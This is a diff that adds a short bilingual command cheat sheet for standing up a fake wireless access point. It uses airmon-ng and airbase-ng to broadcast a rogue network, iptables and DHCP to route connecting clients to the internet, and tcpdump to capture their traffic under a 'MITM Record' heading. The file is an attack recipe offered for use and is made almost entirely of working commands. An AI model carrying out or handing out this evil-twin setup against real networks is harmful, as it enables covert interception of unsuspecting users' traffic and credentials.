@@ -1,0 +1,33 @@
+
+---------------------------------------------------------------------------
+airmon-ng   				# See available wireless network interfaces to use
+airmon-ng start wlan0  		#  Config wireless interface in mod monitor
+
+-------- Creación d eun nuevo screen para crear el AP ---------------------
+screen -S fakeAP 	# Crear el screen
+airbase-ng -c 6 -e "FakeAPname" mon0 [wlan0mon, wlan0]	# Config Fake AP
+Cntrl a d 		# Salir del screen
+
+ifconfig at0 [IP-Address] netmask 255.255.255.0		# config de ip of the new interface
+
+ip route 	# check config
+
+----------------- Config Firewall----------------------
+
+iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE # The output interface is de internet exit interface
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+echo 1 > /proc/sys/net/ipv4/ip_forward 		# If not work 'sudo su' use 
+
+--------------- Config DHCP ----------------
+dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhclient-eth0.pid at0
+
+sudo systemctl start isc-dhcp-server.service
+sudo systemctl staturs isc-dhcp-server.service
+sudo systemctl stop isc-dhcp-server.service
+
+# if failed
+sudo rm /var/run/dhcpd.pid
+
+---------------- MITM Record --------------------------
+
+tcpdump -i at0 -w fileName.pcap -vv
